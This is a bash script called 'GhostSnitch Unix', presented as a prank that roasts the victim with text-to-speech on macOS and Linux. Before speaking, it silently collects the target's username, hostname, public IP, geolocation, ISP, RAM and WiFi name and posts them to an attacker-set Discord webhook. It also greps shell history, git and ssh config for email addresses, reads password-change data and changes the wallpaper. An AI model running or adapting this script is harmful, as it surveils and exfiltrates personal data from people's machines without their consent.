#!/bin/bash
####################################################################################################
# Title       : GhostSnitch Unix
# Version     : 1.2
# Author      : I am TBJr
# Description : Cross-platform roast prank with TTS and recon (macOS + Linux)
####################################################################################################

USERNAME=$(whoami)
OS_TYPE=$(uname)
HOSTNAME=$(hostname)

# --- Configuration -----------------------------------------------------------
DISCORD_WEBHOOK="REPLACE_ME"   # Discord webhook URL — set before deploying
PRANK_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | cut -c1-8 | tr '[:lower:]' '[:upper:]' \
  || uuidgen 2>/dev/null | tr -d '-' | cut -c1-8 | tr '[:lower:]' '[:upper:]' \
  || printf '%08X' $((RANDOM * RANDOM)))
TARGET_ALIAS="$HOSTNAME"
# -----------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# TTS — prefer a real voice; fall back to printing
# ---------------------------------------------------------------------------
function speak() {
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    say "$1"
  elif command -v spd-say &>/dev/null; then
    spd-say "$1"
  elif command -v espeak-ng &>/dev/null; then
    espeak-ng "$1" 2>/dev/null
  elif command -v espeak &>/dev/null; then
    espeak "$1" 2>/dev/null
  elif command -v festival &>/dev/null; then
    echo "$1" | festival --tts 2>/dev/null
  else
    echo "[GhostSnitch] $1"
  fi
}

# ---------------------------------------------------------------------------
# RAM roast
# ---------------------------------------------------------------------------
function get_ram() {
  local RAM=0
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    RAM=$(( $(sysctl -n hw.memsize) / 1073741824 ))
  else
    # free -m is more portable than -g and avoids rounding 7.8GB -> 7
    RAM=$(free -m 2>/dev/null | awk '/Mem:/ { printf "%.0f", $2/1024 }')
  fi
  RAM=${RAM:-0}

  if   [[ "$RAM" -lt 4  ]]; then speak "$RAM gigabytes of RAM? This machine runs on paperclips and prayers."
  elif [[ "$RAM" -lt 8  ]]; then speak "$RAM gigs? Just enough to open a browser tab and regret it."
  elif [[ "$RAM" -lt 16 ]]; then speak "$RAM gigs? Not bad. But your firewall probably runs on trust."
  else                            speak "$RAM gigs? Okay, flex. But I still got in."
  fi
}

# ---------------------------------------------------------------------------
# Public IP — always use a timeout so we don't hang on firewalled networks
# ---------------------------------------------------------------------------
function get_ip() {
  local IP
  IP=$(curl -fsSL --max-time 5 https://ipinfo.io/ip 2>/dev/null \
    || curl -fsSL --max-time 5 https://api4.my-ip.io/ip 2>/dev/null \
    || echo "unknown")
  if [[ "$IP" == "unknown" ]]; then
    speak "Couldn't reach the internet to grab your IP. Nice firewall — or just bad WiFi."
  else
    speak "Your public IP is $IP. You are now visible to the universe."
  fi
}

# ---------------------------------------------------------------------------
# WiFi SSID
# macOS: detect the active Wi-Fi interface dynamically instead of hardcoding en0
# ---------------------------------------------------------------------------
function get_wifi() {
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    # Find the Wi-Fi hardware port's interface name (may be en0, en1, etc.)
    local WIFI_IF
    WIFI_IF=$(networksetup -listallhardwareports 2>/dev/null \
      | awk '/Wi-Fi/{getline; print $NF}')
    if [[ -z "$WIFI_IF" ]]; then
      speak "Couldn't detect a Wi-Fi interface. Are you wired in like it's 2003?"
      return
    fi
    local SSID
    SSID=$(networksetup -getairportnetwork "$WIFI_IF" 2>/dev/null \
      | sed 's/Current Wi-Fi Network: //')
    if [[ -z "$SSID" || "$SSID" == *"not associated"* ]]; then
      speak "You're not connected to any WiFi. Ethernet warrior, or just offline?"
    else
      speak "Your current WiFi is $SSID. Cute network name."
    fi
  elif command -v nmcli &>/dev/null; then
    local SSID
    SSID=$(nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes' | cut -d: -f2)
    if [[ -n "$SSID" ]]; then
      speak "You're connected to $SSID. Probably unprotected, like your passwords."
    else
      speak "No active WiFi found via nmcli. Going undercover, are we?"
    fi
  elif command -v iwgetid &>/dev/null; then
    local SSID
    SSID=$(iwgetid -r 2>/dev/null)
    if [[ -n "$SSID" ]]; then
      speak "WiFi network: $SSID. Interesting choice."
    else
      speak "Couldn't read your WiFi name. Mysterious."
    fi
  else
    speak "I can't find your WiFi name, but I bet it's embarrassing."
  fi
}

# ---------------------------------------------------------------------------
# Password age
# Linux: chage is reliable. macOS: requires root for shadow data — skip gracefully.
# ---------------------------------------------------------------------------
function get_last_pass_change() {
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    # macOS shadow data requires root; report honestly rather than silently stub
    speak "Your password change date is classified on this OS. Which means it's probably ancient."
  else
    if command -v chage &>/dev/null; then
      local DAYS
      DAYS=$(chage -l "$USERNAME" 2>/dev/null | grep "Last password change" | cut -d: -f2 | xargs)
      if [[ -n "$DAYS" ]]; then
        speak "You last changed your password on $DAYS. How retro."
      else
        speak "Couldn't read password age. You might not even have a password."
      fi
    else
      # chage not available (some minimal installs)
      local SHADOW_DATE
      SHADOW_DATE=$(getent shadow "$USERNAME" 2>/dev/null | cut -d: -f3)
      if [[ -n "$SHADOW_DATE" && "$SHADOW_DATE" -gt 0 ]]; then
        local CHANGE_DATE
        CHANGE_DATE=$(date -d "1970-01-01 $SHADOW_DATE days" "+%Y-%m-%d" 2>/dev/null)
        speak "Password last set around $CHANGE_DATE. That's your business. Barely."
      else
        speak "Password age: unknown. Are you even human?"
      fi
    fi
  fi
}

# ---------------------------------------------------------------------------
# Email hint — search shell history and git config across both bash and zsh
# ---------------------------------------------------------------------------
function get_email_hint() {
  local EMAIL
  EMAIL=$(grep -Eoh "[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,6}" \
    ~/.bash_history ~/.zsh_history \
    ~/.gitconfig ~/.config/git/config \
    ~/.ssh/config /etc/gitconfig \
    2>/dev/null | head -n 1)
  if [[ -n "$EMAIL" ]]; then
    speak "Found an email on this system: $EMAIL. Should I send myself a thank-you note?"
  else
    speak "Couldn't find your email. Mysterious. I like it."
  fi
}

# ---------------------------------------------------------------------------
# Wallpaper change
# macOS: use System Events (works on Monterey+); try multiple valid picture paths
# GNOME:  set both picture-uri and picture-uri-dark (required on GNOME 42+)
# ---------------------------------------------------------------------------
function change_wallpaper() {
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    # Try common solid/dark wallpaper paths in order of likelihood
    local WP_PATHS=(
      "/Library/Desktop Pictures/Solid Colors/Black.png"
      "/System/Library/Desktop Pictures/Solid Colors/Solid Gray Dark.png"
      "/Library/Desktop Pictures/Big Sur.heic"
      "/Library/Desktop Pictures/Monterey.heic"
      "/Library/Desktop Pictures/Ventura.heic"
      "/Library/Desktop Pictures/Sonoma.heic"
      "/Library/Desktop Pictures/Sequoia.heic"
    )
    local CHOSEN=""
    for p in "${WP_PATHS[@]}"; do
      if [[ -f "$p" ]]; then
        CHOSEN="$p"
        break
      fi
    done
    if [[ -n "$CHOSEN" ]]; then
      # System Events is the modern approach; Finder's set desktop picture is deprecated
      osascript -e "tell application \"System Events\" to set picture of every desktop to POSIX file \"$CHOSEN\"" 2>/dev/null
      speak "By the way, I changed your wallpaper. You're welcome."
    else
      speak "I tried to redecorate, but your wallpaper library is locked down."
    fi

  elif [[ "$XDG_CURRENT_DESKTOP" == *"GNOME"* ]] && command -v gsettings &>/dev/null; then
    local GNOME_WP=""
    # Search common wallpaper directories for any valid image
    for dir in /usr/share/backgrounds/gnome /usr/share/backgrounds; do
      local f
      f=$(find "$dir" -maxdepth 1 \( -name "*.jpg" -o -name "*.png" -o -name "*.jpeg" \) 2>/dev/null | head -1)
      if [[ -n "$f" ]]; then
        GNOME_WP="$f"
        break
      fi
    done
    if [[ -n "$GNOME_WP" ]]; then
      gsettings set org.gnome.desktop.background picture-uri      "file://$GNOME_WP" 2>/dev/null
      gsettings set org.gnome.desktop.background picture-uri-dark "file://$GNOME_WP" 2>/dev/null
      speak "By the way, I changed your wallpaper. You're welcome."
    else
      speak "Couldn't find a wallpaper to swap in. Your background lives to fight another day."
    fi

  elif [[ "$XDG_CURRENT_DESKTOP" == *"KDE"* ]] && command -v plasma-apply-wallpaperimage &>/dev/null; then
    local KDE_WP
    KDE_WP=$(find /usr/share/wallpapers -name "*.jpg" -o -name "*.png" 2>/dev/null | head -1)
    if [[ -n "$KDE_WP" ]]; then
      plasma-apply-wallpaperimage "$KDE_WP" 2>/dev/null
      speak "Wallpaper changed. Plasma got plastered."
    fi
  fi
}

# ---------------------------------------------------------------------------
# Geolocation — single call to ipwho.is (HTTPS, no key required)
# ---------------------------------------------------------------------------
function get_geo_json() {
  curl -fsSL --max-time 5 "https://ipwho.is/" 2>/dev/null
}

# ---------------------------------------------------------------------------
# Discord report — fires once before TTS; skipped if webhook is REPLACE_ME
# ---------------------------------------------------------------------------
function send_discord_report() {
  [[ "$DISCORD_WEBHOOK" == "REPLACE_ME" ]] && return

  local GEO_JSON
  GEO_JSON=$(get_geo_json)

  local PUB_IP CITY REGION COUNTRY ISP
  PUB_IP=$(echo  "$GEO_JSON" | grep -oP '"ip"\s*:\s*"\K[^"]+' || echo "unknown")
  CITY=$(echo    "$GEO_JSON" | grep -oP '"city"\s*:\s*"\K[^"]+')
  REGION=$(echo  "$GEO_JSON" | grep -oP '"region"\s*:\s*"\K[^"]+')
  COUNTRY=$(echo "$GEO_JSON" | grep -oP '"country"\s*:\s*"\K[^"]+')
  ISP=$(echo     "$GEO_JSON" | grep -oP '"isp"\s*:\s*"\K[^"]+')
  [[ -z "$PUB_IP" ]] && PUB_IP="unknown"
  [[ -z "$CITY"   ]] && CITY="Unknown"

  local RAM_GB=0
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    RAM_GB=$(( $(sysctl -n hw.memsize 2>/dev/null || echo 0) / 1073741824 ))
  else
    RAM_GB=$(free -m 2>/dev/null | awk '/Mem:/ { printf "%.0f", $2/1024 }')
  fi
  RAM_GB=${RAM_GB:-0}

  local WIFI_SSID="Not connected"
  if [[ "$OS_TYPE" == "Darwin" ]]; then
    local WIFI_IF
    WIFI_IF=$(networksetup -listallhardwareports 2>/dev/null | awk '/Wi-Fi/{getline; print $NF}')
    WIFI_SSID=$(networksetup -getairportnetwork "$WIFI_IF" 2>/dev/null \
      | sed 's/Current Wi-Fi Network: //')
  elif command -v nmcli &>/dev/null; then
    WIFI_SSID=$(nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes' | cut -d: -f2)
  elif command -v iwgetid &>/dev/null; then
    WIFI_SSID=$(iwgetid -r 2>/dev/null)
  fi
  [[ -z "$WIFI_SSID" || "$WIFI_SSID" == *"not associated"* ]] && WIFI_SSID="Not connected"

  local TS
  TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date "+%Y-%m-%dT%H:%M:%SZ")

  local JSON
  # Use printf so special characters in field values don't break the heredoc
  JSON=$(printf '{
  "username": "GhostSnitch Unix",
  "content": "**Roast delivered!** | ID: `%s`",
  "embeds": [{
    "title": "GhostSnitch Unix Report",
    "color": 65280,
    "fields": [
      {"name":"Prank ID",  "value":"%s","inline":true},
      {"name":"Target",    "value":"%s","inline":true},
      {"name":"OS",        "value":"%s","inline":true},
      {"name":"Username",  "value":"%s","inline":true},
      {"name":"Public IP", "value":"%s","inline":true},
      {"name":"Location",  "value":"%s, %s, %s","inline":false},
      {"name":"ISP",       "value":"%s","inline":true},
      {"name":"RAM",       "value":"%sGB","inline":true},
      {"name":"WiFi",      "value":"%s","inline":true}
    ],
    "footer":{"text":"GhostSnitch Unix v1.2 by TBJr"},
    "timestamp":"%s"
  }]
}' "$PRANK_ID" "$PRANK_ID" "$TARGET_ALIAS" "$OS_TYPE" "$USERNAME" \
   "$PUB_IP" "$CITY" "$REGION" "$COUNTRY" "$ISP" \
   "$RAM_GB" "$WIFI_SSID" "$TS")

  curl -fsSL --max-time 10 \
    -H "Content-Type: application/json" \
    -d "$JSON" \
    "$DISCORD_WEBHOOK" >/dev/null 2>&1
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
send_discord_report
speak "Hello $USERNAME. Let's see what you're hiding."
get_ram
get_ip
get_wifi
get_last_pass_change
get_email_hint
change_wallpaper
speak "GhostSnitch Unix edition signing off."
